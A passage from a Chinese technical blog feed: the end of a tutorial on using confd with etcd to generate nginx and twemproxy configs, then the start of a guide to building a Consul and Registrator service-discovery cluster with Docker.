<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/confd/conf.d/myapp-nginx.toml</span><br><span class="line"></span><br><span class="line">[template]</span><br><span class="line">prefix = "/myapp"</span><br><span class="line">src = "nginx.tmpl"</span><br><span class="line">dest = "/tmp/myapp.conf"</span><br><span class="line">owner = "nginx"</span><br><span class="line">mode = "0644"</span><br><span class="line">keys = [</span><br><span class="line">  "/services/web"</span><br><span class="line">]</span><br><span class="line">check_cmd = "/usr/sbin/nginx -t -c &#123;&#123;.src&#125;&#125;"</span><br><span class="line">reload_cmd = "/usr/sbin/service nginx reload"</span><br></pre></td></tr></table></figure>

<h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h4><p><code>Template</code>定义了单一应用配置的模板，默认存储在<code>/etc/confd/templates</code>目录下，模板文件符合Go的<a href="http://golang.org/pkg/text/template/" target="_blank" rel="noopener"><code>text/template</code></a>格式。</p>
<p>模板文件常用函数有<code>base</code>，<code>get</code>，<code>gets</code>，<code>lsdir</code>，<code>json</code>等。具体可参考<a href="https://github.com/kelseyhightower/confd/blob/master/docs/templates.md。" target="_blank" rel="noopener">https://github.com/kelseyhightower/confd/blob/master/docs/templates.md。</a></p>
<p>例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat  /etc/confd/templates/nginx.tmpl</span><br><span class="line"></span><br><span class="line">&#123;&#123;range $dir := lsdir "/services/web"&#125;&#125;</span><br><span class="line">upstream &#123;&#123;base $dir&#125;&#125; &#123;</span><br><span class="line">    &#123;&#123;$custdir := printf "/services/web/%s/*" $dir&#125;&#125;&#123;&#123;range gets $custdir&#125;&#125;</span><br><span class="line">    server &#123;&#123;$data := json .Value&#125;&#125;&#123;&#123;$data.IP&#125;&#125;:80;</span><br><span class="line">    &#123;&#123;end&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    server_name &#123;&#123;base $dir&#125;&#125;.example.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass &#123;&#123;base $dir&#125;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="创建后端存储的配置数据"><a href="#创建后端存储的配置数据" class="headerlink" title="创建后端存储的配置数据"></a>创建后端存储的配置数据</h2><p>以<code>etcdv3</code>存储为例，在etcd中创建以下数据.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">etcdctl --endpoints=$endpoints put /services/web/cust1/2 '&#123;"IP": "10.0.0.2"&#125;'</span><br><span class="line">etcdctl --endpoints=$endpoints put /services/web/cust2/2 '&#123;"IP": "10.0.0.4"&#125;'</span><br><span class="line">etcdctl --endpoints=$endpoints put /services/web/cust2/1 '&#123;"IP": "10.0.0.3"&#125;'</span><br><span class="line">etcdctl --endpoints=$endpoints put /services/web/cust1/1 '&#123;"IP": "10.0.0.1"&#125;'</span><br></pre></td></tr></table></figure>

<h2 id="启动confd的服务"><a href="#启动confd的服务" class="headerlink" title="启动confd的服务"></a>启动confd的服务</h2><p>confd支持以<code>daemon</code>或者<code>onetime</code>两种模式运行，当以<code>daemon</code>模式运行时，confd会监听后端存储的配置变化，并根据配置模板动态生成目标配置文件。</p>
<p>如果以<code>daemon</code>模式运行，则执行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">confd -watch -backend etcdv3 -node http://172.16.5.4:12379 &amp;</span><br></pre></td></tr></table></figure>

<p>以下以<code>onetime</code>模式运行为例。其中对应的后端存储类型是<code>etcdv3</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 执行命令</span></span><br><span class="line">confd -onetime -backend etcdv3 -node http://172.16.5.4:12379</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> output</span></span><br><span class="line">2018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO Backend set to etcdv3</span><br><span class="line">2018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO Starting confd</span><br><span class="line">2018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO Backend source(s) set to http://172.16.5.4:12379</span><br><span class="line">2018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO /root/myapp/twemproxy/conf/twemproxy.conf has md5sum 6f0f43abede612c75cb840a4840fbea3 should be 32f48664266e3fd6b56ee73a314ee272</span><br><span class="line">2018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO Target config /root/myapp/twemproxy/conf/twemproxy.conf out of sync</span><br><span class="line">2018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO Target config /root/myapp/twemproxy/conf/twemproxy.conf has been updated</span><br></pre></td></tr></table></figure>

<h2 id="查看生成的配置文件"><a href="#查看生成的配置文件" class="headerlink" title="查看生成的配置文件"></a>查看生成的配置文件</h2><p>在<code>/etc/confd/conf.d/myapp-nginx.toml</code>中定义的配置文件的生成路径为<code>/tmp/myapp.conf</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat myapp.conf</span><br><span class="line"></span><br><span class="line">  upstream cust1 &#123;</span><br><span class="line">      server 10.0.0.1:80;</span><br><span class="line">      server 10.0.0.2:80;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  server &#123;</span><br><span class="line">      server_name cust1.example.com;</span><br><span class="line">      location / &#123;</span><br><span class="line">          proxy_pass cust1;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  upstream cust2 &#123;</span><br><span class="line">      server 10.0.0.3:80;</span><br><span class="line">      server 10.0.0.4:80;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  server &#123;</span><br><span class="line">      server_name cust2.example.com;</span><br><span class="line">      location / &#123;</span><br><span class="line">          proxy_pass cust2;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="confd动态更新twemproxy"><a href="#confd动态更新twemproxy" class="headerlink" title="confd动态更新twemproxy"></a>confd动态更新twemproxy</h2><h3 id="twemproxy-toml"><a href="#twemproxy-toml" class="headerlink" title="twemproxy.toml"></a>twemproxy.toml</h3><p>confd的模板源文件配置：/etc/confd/conf.d/twemproxy.toml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[template]</span><br><span class="line">src = "twemproxy.tmpl"</span><br><span class="line">dest = "/root/myapp/twemproxy/conf/twemproxy.conf"</span><br><span class="line">keys = [</span><br><span class="line">  "/twemproxy/pool"</span><br><span class="line">]</span><br><span class="line">check_cmd = "/usr/local/bin/nutcracker -t -c /root/myapp/twemproxy/conf/twemproxy.conf"</span><br><span class="line">reload_cmd = "bash /root/myapp/twemproxy/reload.sh"</span><br></pre></td></tr></table></figure>

<h3 id="twemproxy-tmpl"><a href="#twemproxy-tmpl" class="headerlink" title="twemproxy.tmpl"></a>twemproxy.tmpl</h3><p>模板文件：/etc/confd/templates/twemproxy.tmpl</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">global:</span><br><span class="line">  worker_processes: 4         # 并发进程数, 如果为0, 这 fallback 回原来的单进程模型(不支持 config reload!)</span><br><span class="line">  user: nobody                # worker 进程的用户, 默认 nobody. 只要主进程是 root 用户启动才生效.</span><br><span class="line">  group: nobody               # worker 进程的用户组</span><br><span class="line">  worker_shutdown_timeout: 30 # 单位为秒. 用于 reload 过程中在改时间段之后强制退出旧的 worker 进程.</span><br><span class="line"></span><br><span class="line">pools: &#123;&#123;range gets "/twemproxy/pool/*"&#125;&#125;</span><br><span class="line">  &#123;&#123;base .Key&#125;&#125;: &#123;&#123;$pool := json .Value&#125;&#125;</span><br><span class="line">    listen: &#123;&#123;$pool.ListenAddr.IP&#125;&#125;:&#123;&#123;$pool.ListenAddr.Port&#125;&#125;</span><br><span class="line">    hash: fnv1a_64 # 选择实例的 hash 规则</span><br><span class="line">    distribution: ketama</span><br><span class="line">    auto_eject_hosts: true # server 有问题是否剔除</span><br><span class="line">    redis: true # 是否为 Redis 协议</span><br><span class="line">    &#123;&#123;if $pool.Password&#125;&#125;redis_auth: &#123;&#123;$pool.Password&#125;&#125;&#123;&#123;end&#125;&#125;</span><br><span class="line">    server_retry_timeout: 5000 # 被剔除多长时间后会重试</span><br><span class="line">    server_connections: 25 # NOTE: server 连接池的大小, 默认为 1, 建议调整</span><br><span class="line">    server_failure_limit: 5 # 失败多少次后暂时剔除</span><br><span class="line">    timeout: 1000 # Server 超时时间, 1 sec</span><br><span class="line">    backlog: 1024 # 连接队列大小</span><br><span class="line">    preconnect: true # 预连接大小</span><br><span class="line">    servers:&#123;&#123;range $server := $pool.Servers&#125;&#125;</span><br><span class="line">     - &#123;&#123;$server.IP&#125;&#125;:&#123;&#123;$server.Port&#125;&#125;:1 &#123;&#123;if $server.Master&#125;&#125;master&#123;&#123;end&#125;&#125;</span><br><span class="line">    &#123;&#123;end&#125;&#125;</span><br><span class="line">&#123;&#123;end&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="etcd中的配置格式"><a href="#etcd中的配置格式" class="headerlink" title="etcd中的配置格式"></a>etcd中的配置格式</h3><p><code>etcd</code>中的配置通过一个map来定义为完整的配置内容。其中<code>key</code>是<code>twemproxy</code>中<code>pool</code>的名称，<code>value</code>是<code>pool</code>的所有内容。</p>
<p>配置对应go结构体如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">type Pool struct&#123;</span><br><span class="line">    ListenAddr  ListenAddr `json:"ListenAddr,omitempty"`</span><br><span class="line">    Servers []Server `json:"Servers,omitempty"`</span><br><span class="line">    Password string `json:"Password,omitempty"`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type ListenAddr struct &#123;</span><br><span class="line">    IP string `json:"IP,omitempty"`</span><br><span class="line">    Port string `json:"Port,omitempty"`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Server struct &#123;</span><br><span class="line">    IP string `json:"IP,omitempty"`</span><br><span class="line">    Port string `json:"Port,omitempty"`</span><br><span class="line">    Master bool `json:"Master,omitempty"`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置对应<code>JSON</code>格式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "ListenAddr": &#123;</span><br><span class="line">        "IP": "192.168.5.7",</span><br><span class="line">        "Port": "22225"</span><br><span class="line">    &#125;,</span><br><span class="line">    "Servers": [</span><br><span class="line">        &#123;</span><br><span class="line">            "IP": "10.233.116.168",</span><br><span class="line">            "Port": "6379",</span><br><span class="line">            "Master": true</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            "IP": "10.233.110.207",</span><br><span class="line">            "Port": "6379",</span><br><span class="line">            "Master": false</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    "Password": "987654"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="生成twemproxy配置文件"><a href="#生成twemproxy配置文件" class="headerlink" title="生成twemproxy配置文件"></a>生成<code>twemproxy</code>配置文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">global:</span><br><span class="line">  worker_processes: 4         # 并发进程数, 如果为0, 这 fallback 回原来的单进程模型(不支持 config reload!)</span><br><span class="line">  user: nobody                # worker 进程的用户, 默认 nobody. 只要主进程是 root 用户启动才生效.</span><br><span class="line">  group: nobody               # worker 进程的用户组</span><br><span class="line">  worker_shutdown_timeout: 30 # 单位为秒. 用于 reload 过程中在改时间段之后强制退出旧的 worker 进程.</span><br><span class="line"></span><br><span class="line">pools:</span><br><span class="line">  redis1:</span><br><span class="line">    listen: 192.168.5.7:22223</span><br><span class="line">    hash: fnv1a_64 # 选择实例的 hash 规则</span><br><span class="line">    distribution: ketama</span><br><span class="line">    auto_eject_hosts: true # server 有问题是否剔除</span><br><span class="line">    redis: true # 是否为 Redis 协议</span><br><span class="line">    redis_auth: 987654</span><br><span class="line">    server_retry_timeout: 5000 # 被剔除多长时间后会重试</span><br><span class="line">    server_connections: 25 # NOTE: server 连接池的大小, 默认为 1, 建议调整</span><br><span class="line">    server_failure_limit: 5 # 失败多少次后暂时剔除</span><br><span class="line">    timeout: 1000 # Server 超时时间, 1 sec</span><br><span class="line">    backlog: 1024 # 连接队列大小</span><br><span class="line">    preconnect: true # 预连接大小</span><br><span class="line">    servers:</span><br><span class="line">     - 10.233.116.169:6379:1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  redis2:</span><br><span class="line">    listen: 192.168.5.7:22224</span><br><span class="line">    hash: fnv1a_64 # 选择实例的 hash 规则</span><br><span class="line">    distribution: ketama</span><br><span class="line">    auto_eject_hosts: true # server 有问题是否剔除</span><br><span class="line">    redis: true # 是否为 Redis 协议</span><br><span class="line">    redis_auth: 987654</span><br><span class="line">    server_retry_timeout: 5000 # 被剔除多长时间后会重试</span><br><span class="line">    server_connections: 25 # NOTE: server 连接池的大小, 默认为 1, 建议调整</span><br><span class="line">    server_failure_limit: 5 # 失败多少次后暂时剔除</span><br><span class="line">    timeout: 1000 # Server 超时时间, 1 sec</span><br><span class="line">    backlog: 1024 # 连接队列大小</span><br><span class="line">    preconnect: true # 预连接大小</span><br><span class="line">    servers:</span><br><span class="line">     - 10.233.110.223:6379:1 master</span><br><span class="line"></span><br><span class="line">     - 10.233.111.21:6379:1</span><br></pre></td></tr></table></figure>

<h2 id="定时自动更新配置"><a href="#定时自动更新配置" class="headerlink" title="定时自动更新配置"></a>定时自动更新配置</h2><p>方法一：使用confd的定时执行机制，启动confd时执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> interval单位是秒，默认值是600秒。</span></span><br><span class="line">confd -interval 60 -backend file -file /tmp/myapp.yaml</span><br></pre></td></tr></table></figure>

<p>方法二：使用操作系统的crontab定时执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">0 * * * * confd -onetime -backend file -file /tmp/myapp.yaml</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>自动化</category>
      </categories>
      <tags>
        <tag>Confd</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Docker+Consul+Registrator的服务注册与发现集群搭建</title>
    <url>/articles/a2710f6.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>微服务架构在互联网应用领域中愈来愈火，引入微服务主要解决了单体应用<strong>多个模块的紧耦合</strong>、<strong>无法扩展</strong>和<strong>运维困难</strong>等问题。微服务架构就是按照<strong>功能粒度</strong>将业务模块进行<strong>垂直拆分</strong>，对单体应用本身进行<strong>服务化</strong>和<strong>组件化</strong>，每个组件单独部署为<strong>小应用</strong>（从<code>DB</code>到<code>UI</code>）。微服务与微服务之间通过<code>Service API</code>进行交互，同时为了支持<strong>水平扩展</strong>、<strong>性能提升</strong>和<strong>服务可用性</strong>，单个服务允许同时部署一个或者多个<strong>服务实例</strong>。在运行时，每个实例通常是一个<strong>云虚拟机</strong>或者<code>Docker</code><strong>容器</strong>。</p>
<p>微服务系统内部多个服务的实例之间如何通信？如何感知到彼此的存在和销毁？生产者服务如何知道消费者服务的地址？如何实现服务与注册中心的解耦？这就需要一个第三方的服务注册中心，提供对生产者服务节点的注册管理和消费者服务节点的发现管理。</p>
<a id="more"></a>

<h2 id="服务发现与注册"><a href="#服务发现与注册" class="headerlink" title="服务发现与注册"></a>服务发现与注册</h2><h4 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h4><ul>
<li><strong>服务注册中心：</strong>作为整个架构中的核心，要支持<strong>分布式</strong>、<strong>持久化存储</strong>，<strong>注册信息变动</strong>实时通知消费者。</li>
<li><strong>服务提供者：</strong>服务以 <code>docker</code> <strong>容器化</strong>方式部署(实现<strong>服务端口</strong>的<strong>动态生成</strong>)，可以通过 <code>docker-compose</code> 的方式来管理。通过 <code>Registrator</code> 检测到 <code>docker</code> 进程信息以完成服务的<strong>自动注册</strong>。</li>
<li><strong>服务消费者：</strong>要使用<strong>服务提供者</strong>提供的服务，和服务提供者往往是动态相互转位置的。</li>
</ul>
<p>一个较为完整的服务注册与发现流程如下：</p>
<p><img src="/articles/a2710f6/1.png" alt></p>
<ol>
<li><strong>注册服务：</strong>服务提供者到注册中心<strong>注册</strong>；</li>
<li><strong>订阅服务：</strong>服务消费者到注册中心<strong>订阅</strong>服务信息，对其进行<strong>监听</strong>；</li>
<li><strong>缓存服务列表：</strong>本地<strong>缓存</strong>服务列表，减少与注册中心的网络通信；</li>
<li><strong>调用服务：</strong>先<strong>查找</strong>本地缓存，找不到再去注册中心<strong>拉取</strong>服务地址，然后发送服务请求；</li>
<li><strong>变更通知：</strong>服务节点<strong>变动</strong>时 (<strong>新增</strong>、<strong>删除</strong>等)，注册中心将通知监听节点，<strong>更新</strong>服务信息。</li>
</ol>
<h4 id="相关组件"><a href="#相关组件" class="headerlink" title="相关组件"></a>相关组件</h4><p>一个服务发现系统主要由三部分组成：</p>
<ol>
<li><strong>注册器(registrator)：</strong>根据服务运行状态，注册/注销服务。主要要解决的问题是，何时发起注册/注销动作。</li>
<li><strong>注册表(registry)：</strong>存储服务信息。常见的解决方案有zookeeper、etcd、cousul等。</li>
<li><strong>发现机制(discovery)：</strong>从注册表读取服务信息，给用户封装访问接口。</li>
</ol>
<h4 id="第三方实现"><a href="#第三方实现" class="headerlink" title="第三方实现"></a>第三方实现</h4><p>对于第三方的服务注册与发现的实现，现有的工具主要有以下三种：</p>
<ol>
<li><strong>zookeeper：</strong>一个高性能、分布式应用程序协调服务，用于名称服务、分布式锁定、共享资源同步和分布式配置管理。</li>
<li><strong>Etcd：</strong>一个采用HTTP协议的健/值对存储系统，主要用于共享配置和服务发现，提供的功能相对Zookeeper和Consul相对简单。</li>
<li><strong>Consul：</strong>一个分布式高可用的服务发现和配置共享的软件，支持服务发现与注册、多数据中心、健康检查和分布式键/值存储。</li>
</ol>
<p>简单对比：</p>
<blockquote>
<p>与Zookeeper和etcd不一样，Consul内嵌实现了服务发现系统，不需要构建自己的系统或使用第三方系统，客户只需要注册服务，并通过DNS或HTTP接口执行服务发现。</p>
</blockquote>
<h2 id="Consul和Registrator"><a href="#Consul和Registrator" class="headerlink" title="Consul和Registrator"></a>Consul和Registrator</h2><h4 id="Consul简介"><a href="#Consul简介" class="headerlink" title="Consul简介"></a>Consul简介</h4><p><strong>Consul是什么</strong></p>
<p><code>Consul</code> 是一种<strong>分布式</strong>的、<strong>高可用</strong>、<strong>支持水平扩展</strong>的的服务注册与发现工具。它大致包括以下特性：</p>
<ul>
<li><strong>服务发现：</strong> <code>Consul</code> 通过 <code>DNS</code> 或者 <code>HTTP</code> 接口使<strong>服务注册和服务发现</strong>变的很容易。一些外部服务，例如 <code>saas</code> 提供的也可以一样注册；</li>
<li><strong>健康检查：</strong>健康检测使 <code>consul</code> 可以快速的告警在集群中的操作。和服务发现的集成，可以防止服务转发到故障的服务上面；</li>
<li><strong>键/值存储：</strong>一个用来<strong>存储动态配置</strong>的系统。提供简单的 <code>HTTP</code> 接口，可以在任何地方操作；</li>
<li><strong>多数据中心：</strong>支持<strong>多数据中心</strong>以避免<strong>单点故障</strong>，内外网的服务采用不同的端口进行监听。而其部署则需要考虑网络延迟, 分片等情况等。<code>zookeeper</code>和<code>etcd</code>均不提供多数据中心功能的支持；</li>
<li><strong>一致性算法：</strong>采用 <code>Raft</code> 一致性协议算法，比<code>Paxos</code>算法好用。 使用 <code>GOSSIP</code> 协议管理成员和广播消息, 并且支持 <code>ACL</code> 访问控制；</li>
<li><strong>服务管理Dashboard：</strong>提供一个 <code>Web UI</code> 的服务注册于<strong>健康状态监控</strong>的管理页面。</li>
</ul>
<p><strong>Consul的几个概念</strong></p>
<p>下图是<code>Consul</code>官方文档提供的架构设计图：</p>
<p><img src="/articles/a2710f6/2.png" alt></p>
<p>图中包含两个<code>Consul</code>数据中心，每个数据中心都是一个<code>consul</code>的集群。在数据中心1中，可以看出<code>consul</code>的集群是由<code>N</code>个<code>SERVER</code>，加上<code>M</code>个<code>CLIENT</code>组成的。而不管是<code>SERVER</code>还是<code>CLIENT</code>，都是<code>consul</code>集群的一个节点。所有的服务都可以注册到这些节点上，正是通过这些节点实现服务注册信息的共享。除了这两个，还有一些小细节 一一 简单介绍。</p>
<ul>
<li><strong>CLIENT</strong></li>
</ul>
<p><code>CLIENT</code>表示<code>consul</code>的<code>client</code>模式，就是<strong>客户端模式</strong>。是<code>consul</code>节点的一种模式，这种模式下，所有注册到当前节点的服务会被<strong>转发</strong>到<code>SERVER</code>节点，本身是<strong>不持久化</strong>这些信息。</p>
<ul>
<li><strong>SERVER</strong></li>
</ul>
<p><code>SERVER</code>表示<code>consul</code>的<code>server</code>模式，表明这个<code>consul</code>是个<code>server</code>节点。这种模式下，功能和<code>CLIENT</code>都一样，唯一不同的是，它会把所有的信息<strong>持久化</strong>的本地。这样遇到故障，信息是可以被保留的。</p>
<ul>
<li><strong>SERVER-LEADER</strong></li>
</ul>
<p>中间那个<code>SERVER</code>下面有<code>LEADER</code>的描述，表明这个<code>SERVER</code>节点是它们的老大。和其它<code>SERVER</code>不一样的一点是，它需要负责<strong>同步注册信息</strong>给其它的<code>SERVER</code>，同时也要负责<strong>各个节点</strong>的<strong>健康监测</strong>。</p>
<ul>
<li><strong>其它信息</strong></li>
</ul>
<p>其它信息包括各个节点之间的<strong>通信方式</strong>，还有<strong>一些协议信息</strong>、<strong>算法</strong>。它们是用于保证节点之间的<strong>数据同步</strong>、<strong>实时性要求</strong>等等一系列集群问题的解决。这些有兴趣的自己看看官方文档。</p>
<h4 id="Registrator简介"><a href="#Registrator简介" class="headerlink" title="Registrator简介"></a>Registrator简介</h4><p><strong>什么是Registrator</strong><br> <code>Registrator</code>是一个独立于服务注册表的<strong>自动服务注册/注销组件</strong>，一般以<code>Docker container</code>的方式进行部署。<code>Registrator</code>会自动侦测它所在的<strong>宿主机</strong>上的所有<code>Docker</code>容器状态（启用/销毁），并根据容器状态到对应的<strong>服务注册列表</strong>注册/注销服务。</p>
<p>事实上，<code>Registrator</code>通过读取同一台宿主机的其他容器<code>Container</code>的<strong>环境变量</strong>进行<strong>服务注册</strong>、<strong>健康检查定义</strong>等操作。</p>
<p><code>Registrator</code>支持<strong>可插拔式</strong>的<strong>服务注册表</strong>配置，目前支持包括<code>Consul</code>, <code>etcd</code>和<code>SkyDNS 2</code>三种注册工具。</p>
<h2 id="Docker安装Consul集群"><a href="#Docker安装Consul集群" class="headerlink" title="Docker安装Consul集群"></a>Docker安装Consul集群</h2><h4 id="集群节点规划"><a href="#集群节点规划" class="headerlink" title="集群节点规划"></a>集群节点规划</h4><p>我本地的使用的是<code>Ubuntu16.04</code>的虚拟机：</p>
<table>
<thead>
<tr>
<th>容器名称</th>
<th>容器IP地址</th>
<th>映射端口号</th>
<th>宿主机IP地址</th>
<th>服务运行模式</th>
</tr>
</thead>
<tbody><tr>
<td>node1</td>
<td>172.17.0.2</td>
<td>8500 -&gt; 8500</td>
<td>192.168.127.128</td>
<td>Server Master</td>
</tr>
<tr>
<td>node2</td>
<td>172.17.0.3</td>
<td>9500 -&gt; 8500</td>
<td>192.168.127.128</td>
<td>Server</td>
</tr>
<tr>
<td>node3</td>
<td>172.17.0.4</td>
<td>10500 -&gt; 8500</td>
<td>192.168.127.128</td>
<td>Server</td>
</tr>
<tr>
<td>node4</td>
<td>172.17.0.5</td>
<td>11500 -&gt; 8500</td>
<td>192.168.127.128</td>
<td>Client</td>
</tr>
</tbody></table>
<h4 id="Consul集群安装"><a href="#Consul集群安装" class="headerlink" title="Consul集群安装"></a>Consul集群安装</h4><p><code>Consul</code>的配置参数信息说明：</p>
<table>
<thead>
<tr>
<th>参数列表</th>
<th>参数的含义和使用场景说明</th>
</tr>
</thead>
<tbody><tr>
<td>advertise</td>
<td>通知展现地址用来改变我们给集群中的其他节点展现的地址，一般情况下-bind地址就是展现地址</td>
</tr>
<tr>
<td>bootstrap</td>
<td>用来控制一个server是否在bootstrap模式，在一个datacenter中只能有一个server处于bootstrap模式，当一个server处于bootstrap模式时，可以自己选举为raft leader</td>
</tr>
<tr>
<td>bootstrap-expect</td>
<td>在一个datacenter中期望提供的server节点数目，当该值提供的时候，consul一直等到达到指定sever数目的时候才会引导整个集群，该标记不能和bootstrap共用</td>
</tr>
<tr>
<td>bind</td>
<td>该地址用来在集群内部的通讯IP地址，集群内的所有节点到地址都必须是可达的，默认是0.0.0.0</td>
</tr>
<tr>
<td>client</td>
<td>consul绑定在哪个client地址上，这个地址提供HTTP、DNS、RPC等服务，默认是127.0.0.1</td>
</tr>
<tr>
<td>config-file</td>
<td>明确的指定要加载哪个配置文件</td>
</tr>
<tr>
<td>config-dir</td>
<td>配置文件目录，里面所有以.json结尾的文件都会被加载</td>
</tr>
<tr>
<td>data-dir</td>
<td>提供一个目录用来存放agent的状态，所有的agent允许都需要该目录，该目录必须是稳定的，系统重启后都继续存在</td>
</tr>
<tr>
<td>dc</td>
<td>该标记控制agent允许的datacenter的名称，默认是dc1</td>
</tr>
<tr>
<td>encrypt</td>
<td>指定secret key，使consul在通讯时进行加密，key可以通过consul keygen生成，同一个集群中的节点必须使用相同的key</td>
</tr>
<tr>
<td>join</td>
<td>加入一个已经启动的agent的ip地址，可以多次指定多个agent的地址。如果consul不能加入任何指定的地址中，则agent会启动失败，默认agent启动时不会加入任何节点</td>
</tr>
<tr>
<td>retry-interval</td>
<td>两次join之间的时间间隔，默认是30s</td>
</tr>
<tr>
<td>retry-max</td>
<td>尝试重复join的次数，默认是0，也就是无限次尝试</td>
</tr>
<tr>
<td>log-level</td>
<td>consul agent启动后显示的日志信息级别。默认是info，可选：trace、debug、info、warn、err</td>
</tr>
<tr>
<td>node</td>
<td>节点在集群中的名称，在一个集群中必须是唯一的，默认是该节点的主机名</td>
</tr>
<tr>
<td>protocol</td>
<td>consul使用的协议版本</td>
</tr>
<tr>
<td>rejoin</td>
<td>使consul忽略先前的离开，在再次启动后仍旧尝试加入集群中</td>
</tr>
<tr>
<td>server</td>
<td>定义agent运行在server模式，每个集群至少有一个server，建议每个集群的server不要超过5个</td>
</tr>
<tr>
<td>syslog</td>
<td>开启系统日志功能，只在linux/osx上生效</td>
</tr>
<tr>
<td>pid-file</td>
<td>提供一个路径来存放pid文件，可以使用该文件进行SIGINT/SIGHUP(关闭/更新)agent</td>
</tr>
</tbody></table>
<h4 id="拉取consul官方镜像"><a href="#拉取consul官方镜像" class="headerlink" title="拉取consul官方镜像"></a>拉取consul官方镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull consul:latest</span><br></pre></td></tr></table></figure>

<h4 id="启动Server节点"><a href="#启动Server节点" class="headerlink" title="启动Server节点"></a>启动Server节点</h4><p>运行<code>consul</code>镜像，启动<code>Server Master</code>节点<code>node1</code>：</p>
<p><strong>node1</strong>:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name=node1 --restart=always \</span><br><span class="line">             -e 'CONSUL_LOCAL_CONFIG=&#123;"skip_leave_on_interrupt": true&#125;' \</span><br><span class="line">             -p 8300:8300 \</span><br><span class="line">             -p 8301:8301 \</span><br><span class="line">             -p 8301:8301/udp \</span><br><span class="line">             -p 8302:8302/udp \</span><br><span class="line">             -p 8302:8302 \</span><br><span class="line">             -p 8400:8400 \</span><br><span class="line">             -p 8500:8500 \</span><br><span class="line">             -p 8600:8600 \</span><br><span class="line">             -h node1 \</span><br><span class="line">             consul agent -server -bind=172.17.0.2 -bootstrap-expect=3 -node=node1 \</span><br><span class="line">             -data-dir=/tmp/data-dir -client 0.0.0.0 -ui</span><br></pre></td></tr></table></figure>

<p>查看<code>node1</code>的日志，追踪运行情况：</p>
<p><img src="/articles/a2710f6/3.png" alt></p>
<p>现在集群中还没有选举<code>leader</code>节点，继续启动其余两台<code>Server</code>节点<code>node2</code>和<code>node3</code>：</p>
<p><strong>node2</strong>:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name=node2 --restart=always \</span><br><span class="line">             -e 'CONSUL_LOCAL_CONFIG=&#123;"skip_leave_on_interrupt": true&#125;' \</span><br><span class="line">             -p 9300:8300  \</span><br><span class="line">             -p 9301:8301 \</span><br><span class="line">             -p 9301:8301/udp \</span><br><span class="line">             -p 9302:8302/udp \</span><br><span class="line">             -p 9302:8302 \</span><br><span class="line">             -p 9400:8400 \</span><br><span class="line">             -p 9500:8500 \</span><br><span class="line">             -p 9600:8600 \</span><br><span class="line">             -h node2 \</span><br><span class="line">             consul agent -server -bind=172.17.0.3 \</span><br><span class="line">             -join=192.168.127.128 -node-id=$(uuidgen | awk '&#123;print tolower($0)&#125;') \</span><br><span class="line">             -node=node2 \</span><br><span class="line">             -data-dir=/tmp/data-dir -client 0.0.0.0 -ui</span><br></pre></td></tr></table></figure>

<p>查看<code>node2</code>节点的进程启动日志：</p>
<p><img src="/articles/a2710f6/4.png" alt></p>
<p><strong>node3</strong>:</p>
